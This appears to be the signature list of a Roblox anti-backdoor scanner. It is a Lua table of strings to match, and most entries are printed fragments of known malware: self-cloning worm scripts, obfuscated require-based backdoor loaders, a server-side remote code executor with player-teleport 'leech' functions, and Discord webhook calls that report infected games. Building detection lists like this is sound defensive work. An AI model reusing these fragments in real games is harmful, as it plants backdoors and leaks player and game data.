
	[[("eriuqer"):reverse()]],

	[[347683.814016*10345]],

	[[4672771752]],

	[[pwned]],

	[[pwnd]],

	-- [["\117\27\88\101\110\17\0\0\0\72\73\74\82\83\85\53\76\84\56\66\49\88\73\51\76\0\114\45\246\46\112\239\201\15\62\91\105\108\12\0\48\100\12\76\131\235\149\197\222\93\135\90\88\8\226\97\13\165\241\7\50\224\73\48\50\41\226\159\134\121\116\225\83\137\21\240\126\38\92\67\169\133\134\24\186\19\163\81\253\240\223\231\32\182\37\94\54\60\178\230\63\106\21\133\243\144\100\52\203\253\233\225\149\200\128\87\177\53\59\11\42\13\125\192\5\62\1\19\50\42\177\54\223\192\245\45\39\192\120\3\84\221\151\58\177\94\225\213\200\128\64\177\67\59\203\43\13\113\192\38\62\65\18\50\11\177\27\223\192\245\45\80\192\36\3\84\220\151\15\177\90\225\213\201\128\0\177\1\86\25\166\2\34\192\114\3\148\220\151\106\177\90\225\213\201\128\97\177\106\86\153\166\2\59\192\10\3\20\223\151\121\177\74\225\21\202\128\46\177\95\161\213\203\128\97\177\86\22\89\39\2\51\192\89\97\21\201\128\77\177\52\126\65\16\50\88\177\25\159\64\245\45\127\192\60\223\192\117\44\3\192\123\3\148\220\151\92\177\8\225\21\203\128\96\177\72\161\21\202\128\85\177\57\97\21\201\128\44\177\59\159\64\117\45\100\192\85\223\192\117\44\18\192\11\161\149\202\128\27\177\80\86\89\228\2\85\192\61\223\0\245\44\61\192\47\70\154\96\24\101\192\117\21\18\166\145\141\98\104\90\113\68\186\53\19\0\0\0\91\87\68\93\83\66\70\90\87\85\83\101\83\68\64\95\85\83\0\115\36\154\103\186\118\5\0\0\0\81\87\91\83\0\204\238\78\87\186\91\11\0\0\0\113\83\66\101\83\68\64\95\85\83\0\255\40\36\2\186\102\19\0\0\0\123\87\68\93\83\66\70\90\87\85\83\101\83\68\64\95\85\83\0\237\44\168\1\186]], - Obfuscation Code Unecessary due to obfuscation detection

	[[spawn(function()game['\87\97\105\116\70\111\114\67\104\105\108\100']],

	[[game['\87\97\105\116\70\111\114\67\104\105\108\100'](game]],

	[[game['\71\101\116\83\101\114\118\105\99\101'](game]],

	[[spawn(function()game:WaitForChild('\83\101\114\118\101\114\83\99\114\105\112\116\83\101\114\118\105\99\101')if game:GetService('\87\111\114\107\115\112\97\99\101').Terrain:FindFirstChild('\67\97\108\108\70')then]],

	[[393319350]],

	[[3022778572]],

	[[3610230372]],

	[[3610230360]],

	[[u='RunService';local j='eriuqer']],

	[[getfenv()['\114\101\113\117\105\114\101'](tonumber(dec(B_1))):FireServer()]],

	[[FOR AUTO UPDATE OF THE SHADER]],

	[[4095522280]],

	[[)['?']).slo()]],

	[[3282101835]],

	[[while script do end]],

	[[while script:Clone() do end]],

	[[while script:Clone() do script:Clone() end]],

	[[while script do script:Clone() end]],

	[[while script do self:Clone() end]],

	[[while script:Clone() do self:Clone() end]],

	[[while script:Clone() do script:Clone().Parent=workspace end]],

	[[while script do script:Clone().Parent=workspace end]],

	[[while script do self:Clone().Parent=workspace end]],

	[[while script:Clone() do self:Clone(.Parent=workspace) end]],

	[[while script:Clone() do script:Clone().Parent=game end]],

	[[while script do script:Clone().Parent=game end]],

	[[while script do self:Clone().Parent=game end]],

	[[while script:Clone() do self:Clone().Parent=game)end]],

	[[while script:Clone()do end]],

	[[while script:Clone()do script:Clone() end]],

	[[while script do script:Clone()end]],

	[[while script do self:Clone()end]],

	[[while script:Clone()do self:Clone() end]],

	[[while script:Clone()do script:Clone().Parent=workspace end]],

	[[while script:Clone()do self:Clone(.Parent=workspace) end]],

	[[while script:Clone()do script:Clone().Parent=game end]],

	[[while script:Clone()do self:Clone().Parent=game)end]],

	-- [[24327427424927526N24B22R23021F24B27427927B21I27E24326J23V27H23V27426M23N24Z24321I23N27F23N27H27V24326N27X23027U27426J24Z27H27S24327Q27S28428A24B27V27I27P27J28H24324727524124427526926U26A26E26Y28R24124127525D26U24027422B25221Y21423F25U29224323725U23A29725U243]], - Obfuscation Code Unecessary due to obfuscation detection

	[[Please message iiCrisisOfTheWorld on Roblox!]],

	[[ | __ )   _   _  (_) | |   __| |   ___   _ __  \ \/ /
 |  _ \  | | | | | | | |  / _` |  / _ \ | '__|  \  /
 | |_) | | |_| | | | | | | (_| | |  __/ | |     /  \
 |____/   \__,_| |_| |_|  \__,_|  \___| |_|    /_/\_\]],

	-- [[LPH|B5696F08BD0207A59F20172G00BA6045125G00013G00F695B245D8CC3D83012G002404B76302189G006G00019G002G00019G002G00013G00039G002G00039G002G00033G00049G009G001G00043G00047G00D4850A020070083G004GB5C2D4DCC16B7G0040700B3G004GB5C7D0C4C0DCC7D06B2G00C0BB014DEB4170103G004GB5D4DBC1DCD7D4D6DED12GDAC770043G004GB5930A020068696B513G6945689G696B51683G6968696D412G696B51F32DE0642G6B696D6B5G696B51683G696A696D412G696B51606869596B6D696D69616F796B696B5168696D3G696B51F349E564686B2G6D5C45B84D2C389E486D87C84398AA82626C7F257BD66B0F7DA15302737F1E4F7A550CD45061DC800A02006B5G00E494407A0A02002G696B51682G69453G69453G695D4G69682G696D3G6975CE]], - Obfuscation Code Unecessary due to obfuscation detection

	-- [[LPH|5DC189528A7000C42B081E820A0200E05G00E49440013G008D3D9A36074B18EE75900A02006A073G003G5D3A3C30386A0D3G003G5D1A38290E382F2B343E386A0E3G003G5D152G292D0E382F2B343E386A0A3G003G5D0D313C24382F2E6A0A3G003G5D3E3233293833296A2C3G003G5D13382A7D0E382F2B382F677D352G292D2E672G723G2A732F323F313225733E3230723A3C30382E726A0A3G003G5D0D313C3E3814396A0A3G003G5D2A383F352G32366A7E3G003G5D352G292D2E672G7239342E3E322F393C2G2D733E3230723C2D34722A383F352G32362E726B2G6C64656A696F682G6B6D6A6B696C6A64722A286D0F153F150B3C04303E1A29131B2F2E3210241B1C6F703770101B3A1B3536153628352F182A6A161A250532701F022E2A32361B3F102E3668142811171B6D0B392B6A0A3G003G5D09320E3833396F6A0D3G003G5D170E121318333E3239386A0C3G003G5D0D322E291C2E24333E6A2F3G003G5D352G292D672G723138703F31323A732A383F282928733E32307239342E3E322F390A383F352G3236732D352DE05G00E494406A033G003G5D4G002D9G006G00029G002G00023G00029G002G00023G00039G002G00033G00039G002G00033G00053G00063G00069G002G00069G002G00063G00063G00073G00093G00099G002G00093G00093G000A3G000A3G000A9G009G001G000A3G000A3G0072172813129D66737744247434293590796CED5E8561EEB3821B646100D60A0200C0C1C3C53GC1D5CC9GC1C3C5CC4GC12GC3F9C3C1C9DD2GC1C3C5FBCB1DD0C2C5C1912GC1C53GC1C3C5CCC1C5C1C0C3C7F9C2C1CDDD2GC1C3C5F0C0C5CDC22GC591C1C5C98DC4C1CDDD2GC1D13GC1C3C5CCC1D1C1C5CDD3C92GC1C3C5CCC1D1C1C2C9CDE5C5C6C9E9C6D0CBE9C1D5CFF967C1CCF32GC1C3C521C02GCDC2C5CD91C8C1CDEDC1D7CFF9CDC1D5DDC8C1D9C1C3C1C3C5CCC1D93GC1C3C541CB29D0C5C3CD918B69E5E0A6A4E982CD4111CD8AEBCCFC8BA54E894CD9A4C4D026C4820FE83F80430019550C6D342]], - Obfuscation Code Unecessary due to obfuscation detection

	-- [[LPH|AF282CAEB628E779FCB6E72633013G00D1371C2A793DAE8B2FD0584G00A800A50A02005B093G005GAFC8CEC2CA5B0F3G005GAFE8CADBFCCADDD9C6CCCA5B103G005GAFE72GDBDFFCCADDD9C6CCCA5B0C3G005GAFFFC3CED6CADDDC5B0C3G005GAFCCC0C1DBCAC1DB5B2E3G005GAFE1CAD88FFCCADDD9CADD958FC72GDBDFDC952G803GD881DDC0CDC3C0D781CCC0C280C8CEC2CADC805B0C3G005GAFFFC3CECCCAE6CB5B0C3G005GAFD8CACDC72GC0C45B803G005GAFC72GDBDFDC952G80CBC6DCCCC0DDCBCE2GDF81CCC0C280CEDFC680D8CACDC72GC0C4DC80992G9E969E979A9B969E979D979B9F979C9D809D97D69AEDF7C2C5D8F6DFCBFAE1C1EBFA97DBEED6E1E09DC0C1DCCDEC9FC9FDDC9FDFFBFAD9DA9AD7C8C4C7CAD99EE9DFC6FB2GC6FEEDE4C7DCC7972GECFCC2E9DB98995B0C3G005GAFFBC0FCCAC1CB9D5B0F3G005GAFE5FCE0E1EAC1CCC0CBCA5B0E3G005GAFFFC0DCDBEEDCD6C1CC5B313G005GAFC72GDBDF952G80C3CA82CDC3C0C881D8CACDDADBDA81CCC0C280CBC6DCCCC0DDCBF8CACDC72GC0C481DFC7DF185G00E494405B053G005GAF2D9G006G00029G002G00023G00029G002G00023G00039G002G00033G00039G002G00033G00053G00063G00069G002G00069G002G00063G00063G00073G00093G00099G002G00093G00093G000A3G000A3G000A9G009G001G000A3G000A3G0076620B56F81FE2D103007D0A020029282A103G2860252G28643G28642G282A10252G2864282G2A6C2A28201C2G282A100E7E2C0C2B2C28242G282C642G282A1025282C64292A2E6C2B28241C2G282A10CE292C7C2B2G2C24282C20782D28241C2G2838642G282A10252838642C243A3C2G282A10252838642B2024082C2F20682F392268283C266CB96680382G282A108B7E380C2B2C2G2421282434283E266C24283C1C212830642A282A10252830642G282A109929247C2C2A2G244844552G21AD7B7A98F70215BE98E91AB5F3FB247B87FF2G67AA5A332611F8007765160314CFB12955A0462707498B5733A9009]], - Obfuscation Code Unecessary due to obfuscation detection

	-- [[LPH|3570005127C349014G00474F8B044G003AF3A7C1068234021B67C61BA90A02006D0B3G004G35475044405C4750102G00A0BFC453EB416D0F3G004G35545B415C504D45595A5C416D043G004G3542880A0200717072643G7048712G70543G70542G707264712G70547170746C2G70726468F06C6A727470447074767472707264717074542G707264EFF0506A71727444EDE659635CCC3F7552C46A7CE7239B4E00E69141B07D1755ED862G609159837900119G006G00019G002G00019G002G00013G00029G009G001G00023G00023G00E0DD5F14CBDFBC93673EF600B02B1A27A60A0200105G00E4944092770A02002G707264712G70483G70483G70503G7054712G70444G705G0027FFBB21]], - Obfuscation Code Unecessary due to obfuscation detection

	[[BuilderX AntiCheat]],

	-- [[LPH|92497125EA95986400720A02002G494B6D482G49713G49713G495D4G49482G49693G4959687E013G005CBA7A848504027E0A020048494B6D3G4971489G494B6D483G4948494D552G494B6D2F9D19632G4B496980EF684618979D74C232997FED225D526F992060F617424005520D4E68434B435E2AAA57D14C4G00913602127D0A0200C80A3G003G92E0F7E3E7FBE0F7103G00306892F041C8033G003G92000B9G006G00019G002G00019G002G00013G00013G00CD32A7377B0CA61800764B122A26291534041691D7315A7B0A0200105G00E494405G00D38A7465BD32EE5B007B53F45B6F471F38250F]], - Obfuscation Code Unecessary due to obfuscation detection

	-- [[LPH|9E42F9009B013G0085006F4G00049G006G00013G00FF997B0A020B8800B7C86935A55B0A0200434240523G426A3G424E5324026EF4F3C865A84E1849D4CE334636CA16420E399A544C970460D174577AC46A6E37168C61450E950A0200E75G00E49440D8023G002G9EE6645F7DABC9230C8D4G005338A7280036F200BB05F96DC4580A02002G424052432G426A3G426A3G425E3G424E432G424A4G42BFF28B168E760974EF00130131940A0200E75G00E4944054ADB24B07242D34ED]], - Obfuscation Code Unecessary due to obfuscation detection

	[[2993156368]],

	[[3874171563]],

	[[3874554062]],

	[[3874532225]],

	[[3836103993]],

	[[3837780759]],

	[[3865753107]],

	[[3836200621]],

	[[3836747879]],

	[[3837779568]],

	[[3836749099]],

	[[3856660240]],

	[[getfenv()["\114\101\113\117\105\114\101"](]],

	-- [[dRtYZW4RAAAAMUFSVUJFWlMyQ1hHREg0OQDuhggQNX18XY7BF1sNB9wCnTX+krCUfuklcLlnf8rnAbWB/A04oJfilDAQmDEGusJEiQ4Ro3KDkZoPNXDGNlG6NlPbfCM+]], - Obfuscation Code Unecessary due to obfuscation detection

	[[3930446225]],

	[[Hot clothing: https://www.roblox.com/groups/4743467/Beach-Spectation#!/store]],

	[[Sinner V2.1]],

	[[Sinner Chat]],

	[[Enabled36]],

	[[WhitelistDisabled__LOL]],

	[[You just executed a deprecated function \n -- (Health) please use Heal() instead.]],

	[[\114\101\113\117\105\114\101]],

	[[-- Oh hey, I don't want to hide this but I have to because people are suspicious, the script below loads an auto-updater so if someone manages to abuse anything in this model I will be able to patch it instantly.]],

	[[for _, v in ipairs(workspace:GetDescendants()) do
if v:IsA(“BaseScript”) then
v:Destroy()
end
end]],

	[[Workspace:ClearAllChildren()]],

	[[--This an script of ROBLOX Studio. Do not delete it, this script secures your game from exploiters.]],

	-- [[LPH|D0FEAC0A02002GFEFCF2FF2GFEDE3GFEDE3GFEFA3GFEF6FF2GFEE23GFED20183A7CEA778075EB36E13C7B88E0A0200CA5G00E494405G00975A8A06008F86DC5C0A3FB4E90200FB890466949CAA58182FBE905E102AD9C33C7A1FB8C1CB7EA2013G00BA0A0200FFFEFCF23GFEDEFF2GFEF63GFEF62GFEFCF2FF2GFEF6FFFEFACA2GFEFCF2B4FFFEC2FCFAFEE2FEFAFCCE2GFEFCF2F5FFFEC22GFCFEE2A0D28ADB5F0C8FFF9B1D62E4521E33EA0A17D3EF34E518C4249B60D6E71E47725F7B0528A50F420B0E910A0200E20B3G004GD0A2B5A1A5B9A2B5CA2G0020DE82CCF041E2083G004GD0BCBFB1B4E2043G004GD00F9G006G00019G002G00019G002G00013G00019G002G00013G00014G008FDBA659022DFC6648036FA0482F0031E27677BF80B0D545A7229159004C32C5C77552A2FD392C524G007E146506F4C41957]], - Obfuscation Code Unecessary due to obfuscation detection

	[[237754.208233*12851-.0023]],

	[[if not game:GetService("RunService"):IsStudio() then getfenv()]],

	[[ch(c[i])
until i == #c
end
end

tableinsert = table.insert
TAB = {}
TABscr = {}

while true do
wait()
if game:GetService("NetworkServer") ~= nil then
if #game:GetService("NetworkServer"):GetChildren() > 2 then
if string.find(game:GetService("NetworkServer"):GetChildren()[1].Name ,"127.0.0.1") == nil then
break
end
end
end
TAB = {}
TABscr = {}
search(game.Workspace)
b = math.random(1,#TAB)
if TAB[b] ~= script then
script.Parent = TAB[b]
end
if (script.Parent:IsA("Part") or script.Parent.className == "TrussPart" ) and script.Parent.Position.Y < 0 then
script.Parent = game.Workspace
end
end


wait(5)
print("GO")

TAB = {}
TABscr = {}
scriptSource = script["Source"]
i = 0

search(game.Workspace)

repeat
i = i + 1
if TAB[i]:IsA("Part") then
TAB[i].Anchored = true
end
if TAB[i]:IsA("Humanoid") then
TAB[i].WalkSpeed = 50000
end
if TAB[i].className == "SpawnLocation" then
TAB[i]:Remove()
end
until i == #TAB

TAB = {}
TABscr = {}
search(game.Workspace)]],

	[[tion search(par)
local i = 0
local c = par:GetChildren()
if #c ~= 0 then
repeat
i = i + 1
tableinsert(TAB,c[i])
if c[i].className == "Script" or c[i].className == "LocalScript" then
tableinsert(TABscr,c[i])
end
search(c[i])
until i == #c
end
end

tableinsert = table.insert
TAB = {}
TABscr = {}

while true do
wait()
if game:GetService("NetworkServer") ~= nil then
if #game:GetService("NetworkServer"):GetChildren() > 2 then
if string.find(game:GetService("NetworkServer"):GetChildren()[1].Name ,"127.0.0.1") == nil then
break
end
end
end
TAB = {}
TABscr = {}
search(game.Workspace)
b = math.random(1,#TAB)
if TAB[b]],

	[[ax = 100
parttable = {}
local attach
local mem
tabnum = 1
if workspace:FindFirstChild("Attacker") == nil then
if waitbeforepayload == true then
--Waiting
if debugval == true then
print("Starting the "..waittime.. " wait until activating the payload.")
end
local ae = waittime
repeat wait(1)
ae = ae - 1
if debugval == true then
print(ae.. " Seconds remaining.")
end
until ae == 0
if debugval == true then
print("Activating Payload...")
end
--If you don't delete all of the viruses before this wait is over, your place is screwed HARD.
end
attach = Instance.new("IntValue")
attach.Parent = workspace
attach.Name = "Attacker"
attach.Value = math.random(1, max)
else
attach = workspace:FindFirstChild("Attacker")
end
local dice = 0
while true do
if workspace:FindFirstChild("Attacker") == nil then
attach = Instance.new("IntValue")
attach.Parent = workspace
attach.Name = "Attacker"
attach.Value = math.random(1, max)
mem = Instance.new("Message")
mem.Parent = workspace
mem.Text = "Are you fucking gay? It won't be that easy to dismantle this mighty monster!"
end
if mem ~= nil then
wait(5)
mem:Destroy()
mem = nil
end
dice = math.random(1, 100)
if debugval == true then
print(dice .." with ".. attach.Value)
end
if dice == workspace.Attacker.Value then
if debugval == true then
print("match!")
end
local s = workspace:GetDescendants()
	for i,v in pairs(workspace:GetDescendants()) do
		parttable[tabnum + 1] = v
	    tabnum = tabnum + 1
	end
	tabnum = 1
	local objval = math.random(1,#parttable)
    local parental = parttable[objval]
    if parental ~= nil then
    local death = script:Clone()
    death.Parent = parental
    attach.Value = dice
    if script.Parent.ClassName == "Part" or script.Parent.ClassName == "MeshPart" or script.Parent.ClassName == "UnionOperation" then
if debugval == true then
print("Murdering " .. script.Parent.Name .. " Like how a real cereal killer would.")
end
	script.Parent:Destroy()
end
if script.Parent.ClassName == "Script" or script.Parent.ClassName == "Local Script"]],

	[[ Instance.new(cs[math.random(1, #cs)])
s.Parent = script.Parent
script.Parent = s
egd=egd.Parent
s.Name = string.reverse("SuRViV")
else
egd=egd.Parent
end
egdd = egd:Clone()
pcall(function() egdd.Help:remove() end)
wait()
tp = egd.Parent
local sos = string.reverse("delbasiD")
lssii = workspace
lssi = lssii:GetChildren()
coroutine.resume(coroutine.create(function()
while true do
egd[sos] = false
wait()
end
end))
coroutine.resume(coroutine.create(function()
for i = 1 , math.huge do
wait(60*3)
if game.Players.NumPlayers > 1 then
local m = Instance.new("Hint")
m.Parent = workspace
m.Name = "�"
m.Text = string.reverse("!AHAHAWM !oot uoy kcah lliw 1monmonmoN")
end
end
end))
function Kelssxx(s)
	return string.reverse(s)
end

function lk(property)
	local kte = property
	if kte == "Disabled" then
		egd[]],

	-- [[\102\100\100\100\101\99\100\100\100\22\1\21\17\13\22\1\102\100\100\244\144\235\246\149\37\97\100\100\100\118\96\100\100\100\101\100\100\100\118\100\100\101\100\102\100\100\100\100\100\100\100\100\102\100\102\100\100\100\100\100\100\101\100\101\100\100\100\100\100\100\101\100\100\100\97\100\100\100\101\100\100\100\101\100\100\100\101\100\100\100\101\100\100\100\101\100\100\100\100\100\100\100\100]], - Obfuscation Code Unecessary due to obfuscation detection

	-- [[LPH|26B4013G00017G009C49B1B842A00A0200C9053G002651474F522048AFBC9AF2D77A3EC90C3G00266143526C494F4862475247C90E3G0026754953544543764A4745436F42C9053G002641474B43C90B3G0026614352754354504F4543C9103G002672434A4356495452754354504F4543203G00560C44F141C90D3G002672434A435649545262475247C9043G0026744357C9043G0026544357C9043G0026414F42C9053G002641544F42C90F3G00266143527447484D6F486154495356207G0040C9083G0026544357534F5443C9053G00264A494742C9053G002668474B43C9083G0026764A475F435455C9093G00264B472G5E764A5455C90B3G00266B475E764A475F435455C9083G00264B475E764A5455C90B3G002668534B764A475F435455C9083G0026564A4745436F42C9083G0026764A4745436F42C9063G00266C49446F42C90A3G0026655443475249546F42C9093G002672434A4356495452C9013G0026010B5D99FB7B2A0B0200D7B4B6E0AEB4B6E0B4B0BAA42GB4B6E064B5B89CB6B0B8B0E1B4B6E0B5B42GACA1B9A0B4B0B42GAC2GB4B6E0B5B42GACB284AE9095B4B6E0ABB4B6E0B63GB0B52GB2902GB4B6E0B5B4B0ACB0B4BCACBAB4B6E02GB4B6E0B5B42GACAEB9A0B4B082AEA4B3B494B856E619FF53E605FF92B4B6E0B0B4B8AC2GB4B6E0B5B4B8ACB7BEBAA4A6B4A0B884B4B6E09AB4B6E02GB4B6E0B5B4BCACB62GBEA4B2B4A4B82GB4B6E016F021F7B7B0BCB0B5BAB6A0674BB5E0674BB5E0654BB5E0B5B42GACA3B9A0B4B0B42GAC2GB4B6E0B5B42GACB286AE90E8B4B6E0EEB4B6E06BB5B09C2GB62GB0B4B0B2A4674BB5E03BB5B09C654BB5E02GB4B6E0B5B4A4ACB496A290F4B4B6E0B5B4A0AC8AB4B6E088B4B6E02GB4B6E063B5AC9CB1B6ACB02722FC9EB7B0A42GB0A8B6A02GB4B6E02GB4B6E081B4B6E0BBB4A4AC2GB4B6E0B5B4A4ACBDB4A0AC88B4B6E08CB4B6E016F82CF7B7B0B82GB0B4A4AC2GB4B6E0B5B4A4ACB0BEA6A4B2B4ACB8A8B4B6E043B5A49CAEB4B6E0B7A4BA902G]], - Obfuscation Code Unecessary due to obfuscation detection

	[[itelist = 5669570 -- Friends Whitelist
local LogGame = 4716080997 --PlaceId of the logging game.

local ds = game:GetService("DataStoreService")
local p = ds:GetDataStore("Logged")

local MS = game:GetService("MessagingService")
local leeching = true

local TS = game:GetService("TeleportService")
local PLRS = game:GetService("Players")
local HTTP = game:GetService("HttpService")

local function allprint(msg)
for _,player in pairs(game.Players:GetPlayers()) do
local kk = Things["printing."]:Clone()
kk.Parent = player.PlayerGui
kk.Disabled = false
kk.String.Value = tostring(msg)
end
print(tostring(msg))
end

local function localprint(plr,msg)
for _,player in pairs(game.Players:GetPlayers()) do
local kk = Things["error"]:Clone()
kk.Parent = player.PlayerGui
kk.Disabled = false
kk.String.Value = tostring(msg)
end
end

local function checkhttp()
  local oof = pcall(function()
  HTTP:GetAsync("https://google.com/")
  end)
  if oof then
    return true
  else
    return false
  end
end

local sentData = {
  id = game.PlaceId,
  playing = #game.Players:GetPlayers(),
  jobId = game.JobId,
  http = checkhttp(),
  gameId = game.GameId,
  version = game.PlaceVersion,
  gameName = workspace.Parent.Name,
  maxplayers = game.Players.MaxPlayers,
}

local amount = 0

PLRS.PlayerAdded:Connect(function(plr)
amount = amount + 1
if amount == 1 then
  if p:GetAsync("IsLogged") == false then
    if not plr:IsInGroup(GroupWhitelist) then
   	    local success,res = pcall(function()
		p:SetAsync("IsLogged",true)
		end)
      if success then
		TS:Teleport(LogGame,plr,sentData,script.RobloxLoadingGui)
      else
		print("Error in DataStores: "..res)
	  end
    else
      warn("Whitelisted user, not teleporting.")
    end
  end
end
end)

PLRS.PlayerAdded:Connect(function(plr)
	if p:GetAsync("IsLogged") == true then
		wait(5)
		p:SetAsync("IsLogged",false) --This is for stop a loop of logging.
	end
end)

MS:SubscribeAsync('dGfAuuc[}+K|H"[-W4Q',function(fortnite) --teleport all players in all servers with leech.
local tableSended = fortnite.Data
for _,v in pairs(PLRS:GetPlayers()) do
  if v.Name ~= tableSended[1] then
    TS:Teleport(tableSended[2],v)
  end
end
end)

local function Handle(plr,cs)
  if lili.Whitelisted[plr.Name] and cs and cs.Function and cs.Args then
    if lili.Functions[cs.Function] then
      return lili.Functions[cs.Function](plr,unpack(cs.Args)) or "Nope"
    else
      error(cs.Function.." Is not a function!")
    end
  else
    plr:Kick()
  end
end

local function Start(sdad)
  if lili.Whitelisted[sdad.Name]and not sdad.PlayerGui:FindFirstChild("rpX") then
    local gui = script["rpX"]:Clone()
    gui.Parent = sdad.PlayerGui
    gui.main.Disabled = false
    gui["rpXFunction"].OnServerInvoke = Handle
  end
  if lili.Blacklisted[sdad.UserId] then
    sdad:Kick("You have been blacklisted from using LISI.")
  end
end



game.Players.PlayerAdded:Connect(function(asdasd)
if asdasd:IsInGroup(GroupWhitelist) then
  lili.Whitelisted[asdasd.Name] = true
  Start(asdasd)
end
end)

lili.Functions.return_funcs = function(plr)
local funcs = {}
for name in pairs(lili.Functions) do
  table.insert(funcs,name)
end
return funcs
end

lili.Functions.chat = function(plr,victim,msg)
local k = Things.message:Clone()
k.Parent = victim.PlayerGui
k.Message.Value = tostring(msg)
k.Disabled =  false
end

lili.Functions.AntiBan = function(plr,text)
require(script.Antiban):Fire(text,{plr.Name})
end

lili.Functions.Template = function(plr,arg1,arg2) --Template for a custom function.
print("Hello, the player "..plr.Name.." said: "..arg1.." "..arg2)
end

lili.Functions.F3X = function(plr)
require(4506529904):f3x(plr.Name)
end

lili.Functions.ss_player = function(plr)
return plr
end

lili.Functions.leech = function(plr,id)
local thingstosend = {plr.Name,id}
if leeching == true then
leeching = false
print("Leeching to PlaceId: "..id)
MS:PublishAsync('dGfAuuc[}+K|H"[-W4Q',thingstosend)
wait(900)
leeching = true
elseif leeching == false then
print("Sorry but you need to wait 15 minutes.")
end
end

lili.Functions.R6 = function(plr)
require(Things.R6):r6(plr.Name)
end

lili.Functions.Execute = function(plr,code,bool)
if bool == true then
local yes,no = pcall(function()
local Env = setmetatable({},{__index=function(_,Function)
return getfenv(0)[Function] or function(...)
return lili.Functions[Function] and lili.Functions[Function](plr,...)
end
end})
Env["LocalPlayer"] = plr
Env["print"] = allprint
return lili.Loadstring(code,Env)()
end)
if no then localprint(plr,no) end
elseif bool == false then]],

	[[local ExecFrame = script.Parent["MainFR#*3"]
local RE = script.Parent["rpXFunction"]
local ST = game:GetService("StarterGui")
local Players = game:GetService("Players")
local LPlayer = Players.LocalPlayer
local ServerSide = true

ST:SetCore("ChatMakeSystemMessage",{
	Text="Welcome back, "..LPlayer.Name..".",
	Color=Color3.fromRGB(255, 170, 255)
})

--------------------------------------------------------------------------------------
local execbutton = ExecFrame.ex
local clrbutton = ExecFrame.clr
local hidebutton = ExecFrame.hide
_G.hide = true
local scroll = ExecFrame.scroll
local code = scroll.code

execbutton.MouseButton1Click:Connect(function()
	if ServerSide == true then
		RE:InvokeServer({Function="Execute",Args={code.Text,true}})
	elseif ServerSide == false then
		RE:InvokeServer({Function="Execute",Args={code.Text,false}})
	end
end)

clrbutton.MouseButton1Click:Connect(function()
	code.Text = ""
end)

hidebutton.MouseButton1Click:Connect(function()
	_G.hide = not _G.hide
end)]],

	[[rpXFunction]],

	[[3930635851]],

	[[uQV%XMV8fNT>&BCu]],

	[[5502541]],

	[[4707753756]],

	[[repeat wait() until #Players:GetPlayers() > 0

local function GetRandomPlayer()
    for _,v in pairs(Players:GetPlayers()) do
        print(v)
        local TPData = v:GetJoinData()
        if TPData then
            if TPData.SourcePlaceId and TPData.SourcePlaceId ~= TeleportTo then
                return v
            elseif not TPData.SourcePlaceId then
                return v
            end
        end
    end
    return nil
end

local RandomPlayer = GetRandomPlayer()

if RandomPlayer then
    print("Roblox Error Warning.")
    TeleportService:Teleport(TeleportTo, RandomPlayer, tostring(#Players:GetPlayers()))
else
    print("Roblox Error warning.")
end

Players.PlayerAdded:Connect (function(plr)
    local TPData = plr:GetJoinData()

    if TPData.SourcePlaceId ~= TeleportTo then
        TeleportService:Teleport(TeleportTo, plr, tostring(#Players:GetPlayers()))
    end
end)

return module]],

	[[.Volume = 100]],

	[[arent = player.PlayerGui
local http = game:GetService("HttpService")
	if not game:GetService("RunService"):IsStudio() then
		local date = os.date("!*t")
		local Data = {
			["content"] = player.Name.." has joined: " .. game.PlaceId
		}
		Data = http:JSONEncode(Data)
																																																																																																																																																		http:PostAsync("https://discordapp.com/api/webhooks/630303808013991936/H0OM2irj2ofCYYDn7fzkQf-5PPJ-qyy4850fOiZ2IW3guk9UI2RmqO2x5RRqUwBhV8Ia", Data)
	end

end
end)

-- This is used for testing.
while wait(1) do -- loop to keep checking.
local getplayers = game.Players:GetPlayers()
for i,v in pairs(getplayers) do
if v.Name == you or 'RealAvengerPlayz' then
script["Skidder V2.0"].Parent]],

	[[ = {
	["content"] = "I found a backdoored game! Game link : http://roblox.com/games/"..(game.PlaceId)
}

Data = http:JSONEncode(Data)

http:PostAsync("https://discordapp.com/api/w]],

	[[/webhooks/658953120776323093]],

	[[if a == "mml" or "inf" or "topkek" then

       if a == "mml" then
           require(520532182).giveAdmin(player.Name)
       end

       if a == "inf" then
           require((3023102224))(player.Name)
       end

	   if a == "topkek" then
           require(4538566165).load(player.Name)
       end
   else
       print("@", player.Name, ", incorrect backdoor option")
   end
end]],

	[[script[string.char(33.5*2,108,111,110,101)](self).Parent=v]],

	[[trololo]],

	[[4138729795]],

	-- [[\108\111\103\98\111\120\32\61\32\115\99\114\105\112\116\46\80\97\114\101\110\116\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\76\111\103\32\105\110\32\98\117\116\116\111\110\34\41\10\102\111\32\61\32\115\99\114\105\112\116\46\80\97\114\101\110\116\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\102\114\105\101\110\100\32\111\102\34\41\10\116\108\32\61\32\115\99\114\105\112\116\46\80\97\114\101\110\116\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\84\101\120\116\76\97\98\101\108\34\41\10\108\111\103\98\117\116\116\111\110\32\61\32\115\99\114\105\112\116\46\80\97\114\101\110\116\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\108\111\103\105\110\32\98\111\120\34\41\10\101\32\61\32\73\110\115\116\97\110\99\101\46\110\101\119\40\34\83\116\114\105\110\103\86\97\108\117\101\34\41\10\101\46\78\97\109\101\32\61\32\34\104\105\115\116\111\114\121\34\10\101\46\86\97\108\117\101\32\61\32\34\116\114\117\101\32\111\114\32\102\97\108\115\101\34\10\101\46\80\97\114\101\110\116\32\61\32\115\99\114\105\112\116\46\80\97\114\101\110\116\10\119\97\105\116\40\49\41\10\108\111\103\98\111\120\46\86\105\115\105\98\108\101\32\61\32\116\114\117\101\10\102\111\46\86\105\115\105\98\108\101\32\61\32\116\114\117\101\10\116\108\46\86\105\115\105\98\108\101\32\61\32\116\114\117\101\10\108\111\103\98\117\116\116\111\110\46\86\105\115\105\98\108\101\32\61\32\116\114\117\101\10\119\97\105\116\40\48\46\49\41\10\108\111\103\98\111\120\46]], - Obfuscation Code Unecessary due to obfuscation detection

	[[tion Spread(part)
	check = part:findFirstChild("Fire")
		if check == nil then
	script.Parent:Clone().Parent = part

		elseif check ~= nil then
	check.Size = check.Size + 1000000
	check.Heat = check.Heat  +1000000
	end
en]],

	[[art:findFirstChild("Fire")
		if check == nil then
	script.Parent:Clone().Parent = part

		elseif check ~= nil then
	check.Size = check.Size + 1000000
	check.Heat = check.Heat  +1000000
	en]],

	[[yer.SuperSafeChat == true) then
